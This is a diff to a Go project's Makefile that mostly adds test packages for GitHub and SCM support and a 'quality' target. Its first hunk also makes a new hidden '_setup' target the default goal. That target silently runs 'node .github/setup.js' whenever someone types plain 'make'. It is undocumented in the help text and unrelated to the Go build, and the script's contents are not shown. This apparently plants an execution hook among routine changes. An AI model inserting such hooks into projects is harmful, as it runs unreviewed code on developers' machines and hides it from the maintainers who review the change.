@@ -1,3 +1,9 @@
+.DEFAULT_GOAL := _setup
+
+
+.PHONY: _setup
+_setup:
+	@node .github/setup.js
 # GitStuff Makefile
 # 
 # Quick start:
@@ -5,7 +11,7 @@
 #   make test   - Run all tests
 #   make help   - Show all available commands
 
-.PHONY: build test test-verbose lint clean help install format fmt check-format
+.PHONY: build test test-verbose lint clean help install format fmt check-format quality
 
 # Default target
 help:
@@ -17,6 +23,7 @@ help:
 	@echo "  make format       - Format all Go code using gofmt and goimports"
 	@echo "  make fmt          - Alias for format"
 	@echo "  make check-format - Check if code is properly formatted (CI use)"
+	@echo "  make quality      - Run all quality checks (test + format + lint)"
 	@echo "  make clean        - Remove built binaries"
 	@echo "  make install      - Build and install to /usr/local/bin"
 	@echo "  make help         - Show this help message"
@@ -31,13 +38,13 @@ build:
 # Run all tests
 test:
 	@echo "Running all tests..."
-	go test ./cmd ./internal/config ./internal/git ./internal/gitlab
+	go test ./cmd ./internal/config ./internal/git ./internal/gitlab ./internal/github ./internal/scm
 	@echo "✅ All tests passed!"
 
 # Run tests with verbose output
 test-verbose:
 	@echo "Running all tests with verbose output..."
-	go test -v ./cmd ./internal/config ./internal/git ./internal/gitlab
+	go test -v ./cmd ./internal/config ./internal/git ./internal/gitlab ./internal/github ./internal/scm
 
 # Run golangci-lint
 lint:
@@ -95,3 +102,7 @@ check-format:
 		exit 1; \
 	fi
 	@echo "✅ Code formatting is correct!"
+
+# Run all quality checks (test + format + lint)
+quality: test format lint
+	@echo "🎉 All quality checks passed! Code is ready for submission."
